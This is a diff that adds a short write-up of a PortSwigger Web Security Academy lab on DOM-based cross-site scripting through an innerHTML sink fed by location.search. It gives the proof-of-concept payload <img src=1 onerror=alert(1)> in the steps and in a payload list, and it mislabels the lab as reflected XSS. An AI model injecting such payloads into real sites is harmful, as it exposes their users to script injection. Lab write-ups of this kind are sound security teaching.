@@ -1,0 +1,27 @@
+## DOM XSS ininnerHTMLsink using sourcelocation.search
+
+**Category:** xss_reflected
+**Difficulty:** Unknown
+
+### Description
+This lab contains a DOM-based cross-site scripting vulnerability in the search blog functionality. It uses aninnerHTMLassignment, which changes the HTML contents of adivelement, using data fromlocation.search.
+
+### Solution Steps
+1. Enter the following into the into the search box: <img src=1 onerror=alert(1)>
+2. Click "Search".
+
+### Key Payloads
+- `innerHTML`
+- `location.search`
+- `alert`
+- `<img src=1 onerror=alert(1)>`
+- `onerror`
+- `alert()`
+
+### Indicators of Success
+- Check for changes in application behavior
+- Look for error messages or data exposure
+- Verify the vulnerability type: xss_reflected
+
+---
+*Source: PortSwigger Web Security Academy*
